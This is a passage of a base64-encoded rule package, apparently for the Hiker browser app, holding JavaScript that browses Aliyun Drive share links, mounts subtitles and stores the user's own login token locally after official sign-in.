3dzZT9zaGFyZUlkPSR7c2hhcmVJZH0mc2hhcmVQd2Q9JHtzaGFyZVB3ZHx8XFxcIlxcXCJ9YDtcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFxcXCLnmbvpmYbotKblj7dcXFwiOlxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vcGFnZS9sb2dpbiNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSNcXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcIuWkjeWItuWIhuS6q+mTvuaOpVxcXCI6XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiY29weTovL2h0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS9zL1xcXCIgKyBzaGFyZUlkICsoZmlsZUlkP1xcXCIvZm9sZGVyL1xcXCIgKyBmaWxlSWQ6XFxcIlxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcIuaJuemHj+aMgui9veacrOWcsOW8ueW5lVxcXCI6XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9wYWdlL2RtTW91bnQjbm9IaXN0b3J5IyNub1JlY29yZEhpc3RvcnkjXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFxcXCLmn6XnnIvmiYvliqjmjILovb3lrZfluZVcXFwiOlxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgem0gPSBzdG9yYWdlMC5nZXRNeVZhcihcXFwibW91bnR6aW11XFxcIiwge30pO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgdGlwID0gem0ubmFtZSA/IFxcXCLlvZPliY3lrZfluZXmlofku7ZcXFxcblxcXCIgKyB6bS5uYW1lICsgXFxcIi5cXFwiICsgem0uZXh0IDogXFxcIui/mOacquaJi+WKqOaMgui9veWtl+W5lVxcXCI7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZpcm0oe1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6ICfmiYvliqjmjILovb3lrZfluZUnLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudDogdGlwICsgXFxcIlxcXFxuKOeCueWHu+WPlua2iOWPr+S7pea4hemZpOaMgui9veWtl+W5lSlcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FuY2VsOiAoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJNeVZhcihcXFwibW91bnR6aW11XFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+W3sua4hemZpOaJi+WKqOaMgui9veWtl+W5lVxcXCI7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47XFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcXFwi6I635Y+W5by55bmV5pCc57Si6KeE5YiZXFxcIjpcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHJ1bGUgPSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcXFwianNcXFwiOiBKU09OLnN0cmluZ2lmeShcXFwiaGlrZXI6Ly9wYWdlL2xvYWREbT9ydWxlPVxcXCIgKyBNWV9SVUxFLnRpdGxlK1xcXCImdGl0bGU9XFxcIikrXFxcIitlbmNvZGVVUklDb21wb25lbnQocGxheWRhdGEudGl0bGUuc3BsaXQoJy0nKVswXSk7XFxcIiwgXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcXFwibmFtZVxcXCI6IE1ZX1JVTEUudGl0bGUgKyBcXFwi5by55bmV5pCc57SiXFxcIlxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9O1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInJ1bGU6Ly9cXFwiICsgYmFzZTY0RW5jb2RlKFxcXCLvv6Vwcm9qZWN0aW9uX3NjcmVlbu+/pVxcXCIgKyBKU09OLnN0cmluZ2lmeShydWxlKSk7XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH0sIHNoYXJlSWQsIHNoYXJlUHdkLCBmaWxlSWQpLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcImljb25fcm91bmRfc21hbGxfNFxcXCIsXFxuICAgICAgICAgICAgICAgIHBpY191cmw6IFxcXCJodHRwczovL2hpa2VyZmFucy5jb20vaW1nL2FsaV9maWxlaW50by5zdmdcXFwiLFxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICAgICAgaXRlbXMucHVzaCh7XFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIlxcbiAgICAgICAgfSk7XFxuICAgIH1cXG4gICAgbGV0IHJlc2NvZCA9IHt9O1xcbiAgICBsZXQgbWFya2VyID0gTVlfUEFSQU1TLm1hcmtlcjsgICAgXFxuICAgIGlmIChpc1NlYXJjaCkge1xcbiAgICAgICAgcmVzY29kID0gYWxpU2hhcmVBcGkuZ2V0U2VhcmNoTGlzdEZpbGUoc2VhcmNoS2V5LCBtYXJrZXIsIG9yZGVyWzBdLCBvcmRlclsxXSk7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICByZXNjb2QgPSBhbGlTaGFyZUFwaS5nZXRMaXN0RmlsZShmaWxlSWQsIG1hcmtlciwgb3JkZXJbMF0sIG9yZGVyWzFdKTtcXG4gICAgfVxcbiAgICBpZiAocmVzY29kLm5leHRfbWFya2VyKSB7XFxuICAgICAgICBzZXRNYXJrZXIocmVzY29kLm5leHRfbWFya2VyKTtcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIHNldE1hcmtlcigpO1xcbiAgICB9XFxuXFxuICAgIHZhciBjb250cyA9IHJlc2NvZC5pdGVtcztcXG4gICAgLy/lrZfluZXljLnphY3lh4blpIdcXG4gICAgbGV0IHN1YkV4dHM9W1xcXCJ2dHRcXFwiLCBcXFwic3J0XFxcIiwgXFxcImFzc1xcXCJdO1xcbiAgICB2YXIgemltdWxpc3QgPSBbXTtcXG4gICAgY29udHMuZm9yRWFjaCgoaXRlbSkgPT4ge1xcbiAgICAgICAgaWYgKHN1YkV4dHMuaW5jbHVkZXMoaXRlbS5maWxlX2V4dGVuc2lvbiAmJiBpdGVtLmZpbGVfZXh0ZW5zaW9uLnRvTG93ZXJDYXNlKCkpKSB7XFxuICAgICAgICAgICAgbGV0IG5hbWUgPSBpdGVtLm5hbWUucmVwbGFjZSgnLicgKyBpdGVtLmZpbGVfZXh0ZW5zaW9uLCAnJyk7XFxuICAgICAgICAgICAgemltdWxpc3QucHVzaCh7XFxuICAgICAgICAgICAgICAgIGV4dDogaXRlbS5maWxlX2V4dGVuc2lvbixcXG4gICAgICAgICAgICAgICAgZmlsZV9pZDogaXRlbS5maWxlX2lkLFxcbiAgICAgICAgICAgICAgICBuYW1lOiBuYW1lXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICAvL+WkhOeQhuWkuOmhteWMuemFjeWtl+W5lVxcbiAgICAvKlxcbiAgICBsZXQgaGFzU3ViID0gemltdWxpc3QubGVuZ3RoID4gMDtcXG4gICAgaWYgKGhhc1N1YiYmcmVzY29kLm5leHRfbWFya2VyKSB7XFxuICAgICAgICBpZiAoemltdWxpc3QubGVuZ3RoID4gNCkge1xcbiAgICAgICAgICAgIHNldFN1YnRpdGxlQ2FjaGUoemltdWxpc3Quc2xpY2UoLTQpKTtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgc2V0U3VidGl0bGVDYWNoZSh6aW11bGlzdCk7XFxuICAgICAgICB9XFxuICAgIH1cXG4gICAgbGV0IGxhc3RJdGVtID0gY29udHMuYXQoLTEpO1xcbiAgICBpZiAoaGFzU3ViJiZsYXN0SXRlbSYmbGFzdEl0ZW0uY2F0ZWdvcnkgPT09IFxcXCJ2aWRlb1xcXCIpIHtcXG4gICAgICAgIHNldFZpZGVvSXRlbUNhY2hlKGNvbnRzLnNwbGljZShjb250cy5sZW5ndGgtMSwxKSk7XFxuICAgIH1cXG4gICAgaWYgKE1ZX1BBR0UgPiAxKSB7XFxuICAgICAgICBsZXQgc3VidGl0bGVDYWNoZSA9IE1ZX1BBUkFNUy5zdWJ0aXRsZUNhY2hlIHx8IFtdO1xcbiAgICAgICAgemltdWxpc3QgPSB6aW11bGlzdC5jb25jYXQoc3VidGl0bGVDYWNoZSk7XFxuICAgICAgICBsZXQgdmlkZW9JdGVtQ2FjaGUgPSBNWV9QQVJBTVMudmlkZW9JdGVtQ2FjaGUgfHwgW107XFxuICAgICAgICBjb250cyA9IHZpZGVvSXRlbUNhY2hlLmNvbmNhdChjb250cyk7XFxuICAgICAgICBzZXRTdWJ0aXRsZUNhY2hlKCk7XFxuICAgICAgICBzZXRWaWRlb0l0ZW1DYWNoZSgpO1xcbiAgICB9Ki9cXG4gICAgLy/nroDkvZPkvJjlhYhcXG4gICAgemltdWxpc3Quc29ydCgoYSwgYikgPT4gKGIubmFtZS5lbmRzV2l0aChcXFwiLnNjXFxcIikgfHwgYi5uYW1lLmVuZHNXaXRoKFxcXCIuY2hzXFxcIikpIC0gKGEubmFtZS5lbmRzV2l0aChcXFwiLnNjXFxcIikgfHwgYS5uYW1lLmVuZHNXaXRoKFxcXCIuY2hzXFxcIikpKTtcXG4gICAgLy9lbmRcXG4gICAgbGV0IHRpdGxlSGVhZCA9IHtcXG4gICAgICAgIHZpZGVvOiBcXFwi8J+OrFxcXCIsXFxuICAgICAgICBhdWRpbzogXFxcIvCfjrVcXFwiLFxcbiAgICAgICAgZG9jOiBcXFwi8J+TkVxcXCIsXFxuICAgICAgICBpbWFnZTogXFxcIvCflrxcXFwiLFxcbiAgICAgICAgemlwOiBcXFwi8J+TplxcXCIsXFxuICAgICAgICBmb2xkZXI6IFxcXCLwn5OCXFxcIlxcbiAgICB9O1xcbiAgICBsZXQgZm9sZGVyU3R5bGUsIGZpbGVTdHlsZSwgaXNXYXRjaGluZyA9IHN0eWxlID09PSBcXFwi6L+95YmnXFxcIjtcXG4gICAgaWYgKGlzV2F0Y2hpbmcpIHtcXG4gICAgICAgIGZvbGRlclN0eWxlID0gXFxcImF2YXRhclxcXCI7XFxuICAgICAgICBmaWxlU3R5bGUgPSBcXFwibW92aWVfMlxcXCI7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgICBmb2xkZXJTdHlsZSA9IGZpbGVTdHlsZSA9IHN0eWxlO1xcbiAgICB9XFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgY29udHMubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgIGxldCBmaWxlSXRlbSA9IGNvbnRzW2ldO1xcbiAgICAgICAgbGV0IGNhdGUgPSBmaWxlSXRlbS5jYXRlZ29yeTtcXG4gICAgICAgIGxldCBkZXNjID0gZm9ybWF0RGF0ZShmaWxlSXRlbS51cGRhdGVkX2F0KTtcXG4gICAgICAgIGxldCBwaWNfdXJsID0gZ2V0SWNvbihmaWxlSXRlbS5maWxlX2V4dGVuc2lvbiwgZmlsZUl0ZW0udHlwZSk7XFxuXFxuICAgICAgICBpZiAoZmlsZUl0ZW0udHlwZSA9PT0gXFxcImZvbGRlclxcXCIpIHtcXG4gICAgICAgICAgICBsZXQgdGl0bGUgPSAoZm9sZGVyU3R5bGUgPT09IFxcXCJ0ZXh0XzFcXFwiID8gdGl0bGVIZWFkLmZvbGRlciA6IFxcXCJcXFwiKSArIGZpbGVJdGVtLm5hbWU7XFxuICAgICAgICAgICAgaXRlbXMucHVzaCh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXG4gICAgICAgICAgICAgICAgdXJsOiAnaGlrZXI6Ly9wYWdlL2FsaXl1bj9wYWdlPWZ5cGFnZScsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBmb2xkZXJTdHlsZSxcXG4gICAgICAgICAgICAgICAgZGVzYzogZm9ybWF0RGF0ZShmaWxlSXRlbS51cGRhdGVkX2F0KSxcXG4gICAgICAgICAgICAgICAgcGljX3VybDogcGljX3VybCxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlSWQ6IHNoYXJlSWQsXFxuICAgICAgICAgICAgICAgICAgICBzaGFyZVRva2VuOiBNWV9QQVJBTVMuc2hhcmVUb2tlbixcXG4gICAgICAgICAgICAgICAgICAgIGZpbGVJZDogZmlsZUl0ZW0uZmlsZV9pZCxcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlUHdkOiBzaGFyZVB3ZCxcXG4gICAgICAgICAgICAgICAgICAgIHBhZ2VUaXRsZTogZmlsZUl0ZW0ubmFtZSxcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICBsZXQgc3VidGl0bGUsIGxvbmdjLCBjbHM7XFxuICAgICAgICAgICAgbGV0IHRpdGxlID0gKGZpbGVTdHlsZSA9PT0gXFxcInRleHRfMVxcXCIgPyAodGl0bGVIZWFkW2NhdGVdIHx8IFxcXCLinZNcXFwiKSA6IFxcXCJcXFwiKSArIGZpbGVJdGVtLm5hbWU7XFxuICAgICAgICAgICAgbGV0IG5hbWVOb3RFeHQgPSBmaWxlSXRlbS5uYW1lLnJlcGxhY2UoJy4nICsgZmlsZUl0ZW0uZmlsZV9leHRlbnNpb24sICcnKTtcXG4gICAgICAgICAgICBpZiAoc3ViRXh0cy5pbmNsdWRlcyhmaWxlSXRlbS5maWxlX2V4dGVuc2lvbikpIHtcXG4gICAgICAgICAgICAgICAgbG9uZ2MgPSBbe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLmjILovb3lrZfluZVcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAganM6ICQudG9TdHJpbmcoKHptKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoJ21vdW50emltdScsIHptKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5oyC6L295a6M5oiQ77yM5b2T5YmN5a2X5bmV5paH5Lu2OiAnICsgem0ubmFtZSArICcuJyArIHptLmV4dDtcXG4gICAgICAgICAgICAgICAgICAgIH0sIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBleHQ6IGZpbGVJdGVtLmZpbGVfZXh0ZW5zaW9uLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQ6IGZpbGVJdGVtLmZpbGVfaWQsXFxuICAgICAgICAgICAgICAgICAgICAgICAgbmFtZTogbmFtZU5vdEV4dFxcbiAgICAgICAgICAgICAgICAgICAgfSksXFxuICAgICAgICAgICAgICAgIH1dO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBpZiAoY2F0ZSA9PT0gXFxcInZpZGVvXFxcIikge1xcbiAgICAgICAgICAgICAgICBpZiAoemltdWxpc3QubGVuZ3RoKSB7XFxuICAgICAgICAgICAgICAgICAgICBzdWJ0aXRsZSA9IHppbXVsaXN0LmZpbmQodiA9PiB2Lm5hbWUuaW5jbHVkZXMobmFtZU5vdEV4dCkpO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGNscyA9IFxcXCJwbGF5bGlzdFxcXCI7XFxuICAgICAgICAgICAgICAgIHBpY191cmwgPSBmaWxlSXRlbS50aHVtYm5haWwgfHwgcGljX3VybDtcXG4gICAgICAgICAgICB9IGVsc2UgaWYgKGlzV2F0Y2hpbmcpIHtcXG4gICAgICAgICAgICAgICAgY29udGludWU7XFxuICAgICAgICAgICAgfVxcblxcbiAgICAgICAgICAgIGlmIChmaWxlU3R5bGUgPT09IFxcXCJ0ZXh0XzFcXFwiKSB7XFxuICAgICAgICAgICAgICAgIGRlc2MgKz0gXFxcIlxcXFx0XFxcXHRcXFwiICsgZm9ybWF0U2l6ZShmaWxlSXRlbS5zaXplKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgaXRlbXMucHVzaCh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKCkubGF6eVJ1bGUoKHNoYXJlSWQsIHNoYXJlUHdkLCBzaGFyZVRva2VuLCBmaWxlSWQsIGNhdGUsIHN1YnRpdGxlKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvYWxpbGF6eVxcXCIpKHNoYXJlSWQsIHNoYXJlUHdkLCBzaGFyZVRva2VuLCBmaWxlSWQsIGNhdGUsIHN1YnRpdGxlKTtcXG4gICAgICAgICAgICAgICAgfSwgc2hhcmVJZCwgc2hhcmVQd2QsIE1ZX1BBUkFNUy5zaGFyZVRva2VuLCBmaWxlSXRlbS5maWxlX2lkLCBjYXRlLCBzdWJ0aXRsZSksXFxuICAgICAgICAgICAgICAgIGRlc2M6IGRlc2MsXFxuICAgICAgICAgICAgICAgIHBpY191cmw6IHBpY191cmwsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBpZDogZmlsZUl0ZW0uZmlsZV9pZCxcXG4gICAgICAgICAgICAgICAgICAgIGxvbmdDbGljazogbG9uZ2MsXFxuICAgICAgICAgICAgICAgICAgICBjbHM6IGNscyxcXG4gICAgICAgICAgICAgICAgICAgIC8vaW5oZXJpdFRpdGxlOiBmYWxzZSxcXG4gICAgICAgICAgICAgICAgICAgIHBhZ2VUaXRsZTogZmlsZUl0ZW0ubmFtZVxcbiAgICAgICAgICAgICAgICB9LFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogZmlsZVN0eWxlXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgIH1cXG4gICAgaWYgKGNvbnRzLmxlbmd0aCA9PT0gMCkge1xcbiAgICAgICAgaXRlbXMucHVzaCh7XFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnOKAneKAnVxcXCIgKyBcXFwifn5+5LuA5LmI6YO95rKh5pyJ5LqG5ZOmfn5+XFxcIi5mb250Y29sb3IoXFxcIkdyYXlcXFwiKSxcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2UsXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuICAgIH1cXG59XFxuXFxubGV0IGl0ZW1zID0gW107XFxudHJ5IHtcXG4gICAgaWYgKE1ZX1BBR0UgPiAxICYmICFNWV9QQVJBTVMubWFya2VyKSB7XFxuICAgICAgICBpdGVtcy5wdXNoKHtcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiLFxcbiAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vZW1wdHlcXFwiLFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi4oCc4oCc4oCd4oCdXFxcIiArIFxcXCJ+fn7ku4DkuYjpg73msqHmnInkuoblk6Z+fn5cXFwiLmZvbnRjb2xvcihcXFwiR3JheVxcXCIpLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZSxcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIGxvYWQoaXRlbXMpO1xcbiAgICB9XFxufSBjYXRjaCAoZSkge1xcbiAgICBpZiAoZS5uYW1lID09PSBcXFwiQWxpRXJyb3JcXFwiKSB7XFxuICAgICAgICBpZiAoZS5jb2RlID09PSBcXFwiSW52YWxpZFJlc291cmNlLlNoYXJlUHdkXFxcIikge1xcbiAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuivt+i+k+WFpeaPkOWPlueggVxcXCIsXFxuICAgICAgICAgICAgICAgIGRlc2M6IHNoYXJlUHdkID8gXFxcIuKAnOKAnOaPkOWPlueggemUmeivr+KAneKAnVxcXCIgOiBcXFwiXFxcIixcXG4gICAgICAgICAgICAgICAgdXJsOiAkKCkuaW5wdXQoKE1ZX1BBUkFNUykgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgc2V0UGFnZVBhcmFtcyhPYmplY3QuYXNzaWduKHt9LCBNWV9QQVJBTVMsIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBzaGFyZVB3ZDogaW5wdXRcXG4gICAgICAgICAgICAgICAgICAgIH0pKTtcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgICAgIH0sIE1ZX1BBUkFNUyksXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCJcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgaWYgKGUuc2lnbmlmaWNhbmNlID09PSAxKSB7XFxuICAgICAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLigJzigJzigJ3igJ1cXFwiICsgZS5tZXNzYWdlLmJpZygpLmJpZygpLmZvbnRjb2xvcihcXFwicmVkXFxcIiksXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMScsXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoZS5zaWduaWZpY2FuY2UgPT09IDMpIHtcXG4gICAgICAgICAgICAgICAgaXRlbXMucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnOKAneKAnVxcXCIgKyBlLm1lc3NhZ2UuYmlnKCkuZm9udGNvbG9yKFxcXCJncmVlblxcXCIpLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG5cXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIGxvZyhcXFwi5YiX6KGo5Yqg6L295aSx6LSlI1xcXFxu6ZSZ6K+v5L+h5oGvPlxcXCIgKyBlLnRvU3RyaW5nKCkgKyBcXFwiXFxcXG7plJnor6/ooYw+XFxcIiArIGUubGluZU51bWJlcik7XFxuICAgICAgICBpdGVtcy5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogJ+asp+asp++8jOaKpemUmeS6huOAguWcqOWIt+aWsOWHoOasoe+8n+aIluiAheabtOaNouaWh+S7tuWkueOAgicsXFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICAgICAgZGVzYzogZS50b1N0cmluZygpLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMSdcXG4gICAgICAgIH0pO1xcbiAgICAgICAgLy90aHJvdyBlO1xcbiAgICB9XFxufVxcbnNhdmVNeVBhQ2FjaGUoKTtcXG5zZXRSZXN1bHQoaXRlbXMpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi55m75b2V6LSm5Y+3XCIsXCJwYXRoXCI6XCJsb2dpblwiLFwicnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5zZXRQYWdlVGl0bGUoXFxcIumYv+mHjOS6keebmOeZu+mZhlxcXCIpO1xcbmxldCBsb2dpblVybHMgPSBbXFxcImh0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS9zaWduXFxcIiwgXFxcImh0dHBzOi8vYXV0aC5hbGl5dW5kcml2ZS5jb20vdjIvb2F1dGgvYXV0aG9yaXplP2xvZ2luX3R5cGU9Y3VzdG9tJnJlc3BvbnNlX3R5cGU9Y29kZSZyZWRpcmVjdF91cmk9aHR0cHMlM0ElMkYlMkZ3d3cuYWxpeXVuZHJpdmUuY29tJTJGc2lnbiUyRmNhbGxiYWNrJmNsaWVudF9pZD0yNWR6WDN2Yllxa3RWeHlYJnN0YXRlPSU3QiUyMm9yaWdpbiUyMiUzQSUyMiolMjIlN0QjL2xvZ2luXFxcIl07XFxubGV0IGluZGV4ID0gTnVtYmVyKGdldFBhcmFtKFxcXCJpbmRleFxcXCIsIFxcXCIxXFxcIikpO1xcbmlmIChOdW1iZXIuaXNOYU4oaW5kZXgpKSB7XFxuICAgIGluZGV4ID0gMTtcXG59XFxubGV0IHVybCA9IGxvZ2luVXJsc1tpbmRleF07XFxubGV0IGlzUmVmcmVzaCA9ICFnZXRQYXJhbShcXFwibm9SZWZyZXNoXFxcIik7XFxubGV0IGFsaVRva2Vuc0ZpbGVwYXRoPSAkLnJlcXVpcmUoXFxcInRva2VuUGF0aFxcXCIpLmFsaVRva2Vuc0ZpbGVwYXRoO1xcblxcbnZhciBqcyA9ICQudG9TdHJpbmcoKGlzUmVmcmVzaCwgYWxpVG9rZW5zRmlsZXBhdGgpID0+IHtcXG4gICAgc2V0SW50ZXJ2YWwoKCkgPT4ge1xcbiAgICAgICAgdmFyIHRva2VuID0gSlNPTi5wYXJzZShsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKSlcXG4gICAgICAgIGlmICh0b2tlbiAmJiB0b2tlbi51c2VyX2lkKSB7XFxuICAgICAgICAgICAgbGV0IHRva2VuX3VybCA9IGFsaVRva2Vuc0ZpbGVwYXRoO1xcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAud3JpdGVGaWxlKHRva2VuX3VybCwgSlNPTi5zdHJpbmdpZnkodG9rZW4pKTtcXG4gICAgICAgICAgICBsb2NhbFN0b3JhZ2UuY2xlYXIoKTtcXG4gICAgICAgICAgICBmeV9icmlkZ2VfYXBwLmJhY2soaXNSZWZyZXNoKTtcXG4gICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnRvYXN0KCdUT0tFTuiOt+WPluaIkOWKn++8jOivt+WLv+azhOa8j+S4quS6uumakOenge+8ge+8ge+8gScpO1xcbiAgICAgICAgICAgIHJldHVybjtcXG4gICAgICAgIH1cXG4gICAgfSwgMzAwKTtcXG59LCBpc1JlZnJlc2gsIGFsaVRva2Vuc0ZpbGVwYXRoKTtcXG5cXG5kLnB1c2goe1xcbiAgICB1cmw6IHVybCxcXG4gICAgY29sX3R5cGU6ICd4NV93ZWJ2aWV3X3NpbmdsZScsXFxuICAgIGRlc2M6ICcxMDAlJiZmbG9hdCcsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICBjYW5CYWNrOiBmYWxzZSxcXG4gICAgICAgIGpzOiBqcyxcXG4gICAgICAgIHVybEludGVyY2VwdG9yOiAkLnRvU3RyaW5nKCgpID0+IHRydWUpXFxuICAgIH1cXG59KTtcXG5zZXRSZXN1bHQoZCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLpmL/ph4zliJfooahBUElcIixcInBhdGhcIjpcIkFsaUFwaVwiLFwicnVsZVwiOlwianM6XFxuLy9AYXV0aG9yIExveURnSWtcXG5mdW5jdGlvbiBBbGlFcnJvcihlcnJvckNvZGUsIG1lc3NhZ2UsIHNpZ25pZmljYW5jZSkge1xcbiAgICBsZXQgZXJyb3JUeXBlID0gQWxpRXJyb3IuZXJyb3JDb2RlTWFwLmdldChlcnJvckNvZGUpIHx8IFtdO1xcbiAgICB0aGlzLmNvZGUgPSBlcnJvckNvZGU7XFxuICAgIHRoaXMubWVzc2FnZSA9IGVycm9yVHlwZVswXSB8fCBtZXNzYWdlIHx8IFxcXCJcXFwiO1xcbiAgICB0aGlzLm5hbWUgPSBcXFwiQWxpRXJyb3JcXFwiO1xcbiAgICB0aGlzLnNpZ25pZmljYW5jZSA9IGVycm9yVHlwZVsxXSB8fCBzaWduaWZpY2FuY2UgfHwgMTtcXG59XFxuQWxpRXJyb3IuZXJyb3JDb2RlTWFwID0gbmV3IE1hcChbXFxuICAgIFtcXFwiU2hhcmVMaW5rLkNhbmNlbGxlZFxcXCIsIFtcXFwi5YiG5Lqr6ZO+5o6l5bey5aSx5pWIXFxcIl1dLFxcbiAgICBbXFxcIlNoYXJlTGluay5Gb3JiaWRkZW5cXFwiLCBbXFxcIui/neinhOi1hOa6kOW3suiiq+WwgeemgVxcXCJdXSxcXG4gICAgW1xcXCJOb3RGb3VuZC5TaGFyZUxpbmtcXFwiLCBbXFxcIuS4jeWtmOWcqOivpemTvuaOpeivt+aguOWvuVxcXCJdXSxcXG4gICAgW1xcXCJBY2Nlc